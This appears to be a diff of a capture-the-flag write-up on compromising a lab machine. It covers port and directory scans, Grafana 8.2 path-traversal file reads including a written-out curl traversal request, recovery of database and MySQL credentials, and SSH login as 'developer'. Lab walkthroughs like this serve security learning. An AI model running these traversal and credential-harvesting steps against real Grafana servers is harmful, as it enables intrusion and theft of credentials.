@@ -1,5 +1,8 @@
 ![image](https://user-images.githubusercontent.com/105310322/193700576-4c367863-b493-473b-811d-8f9f18946064.png)
 
+### Tools: feroxbuster, sqlitebrowser, sqldump
+
+### Vulnerabilities: Grafana LFI, MySQL creds, 
 
 ```console
 └─$ nmap -A -p- -T4 -Pn 10.129.51.253
@@ -124,6 +127,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 131.31 seconds
 ```
 
+Run a quick feroxbuster before we visit the site.
+
 ```
 └─$ feroxbuster -u http://10.129.51.253/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git -q 
 200      GET      155l      305w     3654c http://10.129.51.253/
@@ -139,8 +144,11 @@ Nmap done: 1 IP address (1 host up) scanned in 131.31 seconds
 301      GET        9l       28w      319c http://10.129.51.253/posts/page => http://10.129.51.253/posts/page/
 403      GET        9l       28w      278c http://10.129.51.253/server-status
 ```
+The site gives us a hint about the user developer and where to find the password, But thats all there is for this page.
 
 ![image](https://user-images.githubusercontent.com/105310322/193699279-feb25054-fb07-4c79-9ba4-ea5ae01264de.png)
+
+With port 3000 and running http lets run another feroxbuster. It brings back alot more info but nothing we could'nt have found by accessing the site.
 
 ```console
 └─$ feroxbuster -u http://10.129.51.253:3000/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git -q
@@ -242,14 +250,16 @@ WLD         -         -         - http://10.129.51.253:3000/3ca9506f5a03461685b7
 302      GET        2l        2w       54c http://10.129.51.253:3000/public/app/plugins/datasource => /public/app/plugins/datasource/
 ```
 
-Gave back a login screen, attempted login bypass with sql injection but had no luck.
+Accessing the site gave back a login screen, I attempted login bypass with sql injection but had no luck.
 
 ![image](https://user-images.githubusercontent.com/105310322/193699522-4de4729e-b5b5-4eb3-9ffd-d62293f07f64.png)
 
 
-Found an exploit for grafana that allowed you to read files. We can confirm the version of this grafana by looking at the bottom of the login screen. This shows that our version is 8.2.
+Instead there was a simple exlpoit for grafana that allowed you to read files. Which is really just an LFI. TO mkae sure it is vulnerable we can confirm the version of this grafana by looking at the bottom of the login screen. This shows that our version is 8.2.
 
 https://www.exploit-db.com/exploits/50581
+
+Running the exploit we can read any files we know are there and that we have access too. I was not able to grab much else but.....
 
 ```console
 └─$ python3 50581.py -H http://10.129.51.253:3000
@@ -293,27 +303,48 @@ mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
 consul:x:997:997::/home/consul:/bin/false
 ```
 
-I had problems running this exploit but this page gave some good insight on what files to look for. Doing so gave me some login information.
+This other exploit gave good info on what to search for with grafana. Unfortunately I had issues running the exploit but my previous one worked so I just put them together.
 
 https://github.com/jas502n/Grafana-CVE-2021-43798
 
+These 2 files that are mentioned in the exploit are super important. They have creds hiding in them.
+
+```
 /var/lib/grafana/grafana.db
 /etc/grafana/grafana.ini
+```
+By lookoing in grafan.ini we find the following creds.
 
-
+```
 admin
 messageInABottle685427
+```
 
-However when I used it to read the grafana.db file it was not giving me the full password so I instead had to pull the file with curl and then view it with sqlitebrowser.
+grafana.db had alot more info and some weird credentials. Using the previous exploit I was able to get part of a password and the username.
+
+Note: When I tried this for a 2nd and 3rd time after reseting the machine these credentials were not here at all.
+
+```
+grafana
+dontStandSoCloseToMe
+```
+
+But this did not work.
+
+So I tried the manual version of the LFI and pulled the file straight from the site with curl and then viewed it with sqlitebrowser.
 
 ```curl -u admin:messageInABottle685427 --path-as-is http://10.129.52.15:3000/public/plugins/alertlist/../../../../../../../../../../../../../var/lib/grafana/grafana.db -o grafana.db```
 
+Doing so we can find the creds under data-source!
+
+```
 Grafana
 dontStandSoCloseToMe63221!
-
+```
 
 ![image](https://user-images.githubusercontent.com/105310322/193697435-4d0f1c62-016a-48dd-bbf6-cb44fd87f056.png)
 
+We can confirm that we are able to login through mysql with the username and password.
 
 ```console
 └──╼ [★]$ mysql -h 10.129.52.15 -u grafana -p
@@ -328,16 +359,28 @@ Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 
 MySQL [(none)]> 
 ```
+But because I did not want to go through using mysql manually I opted to dump the database and just grep the password.
+
+From the hint earlier on the first webpage about a user named developer I grepped for that name and luckily got back a base64 encoded password!
 
 ```console
 └──╼ [★]$ mysqldump -h 10.129.52.15 -u grafana -p --all-databases > mysql
 └──╼ [★]$ cat mysql | grep developer
 ```
+My grepped line.
 
 ```INSERT INTO `users` VALUES ('developer','YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==');```
 
+The full creds for decoded.
+
+```
 developer
 anEnglishManInNewYork027468
+```
+
+We are in as developer!
+
+Not too hard so far, lets see what the PE vector has in store for us.
 
 ```console
 └──╼ [★]$ ssh developer@10.129.52.15
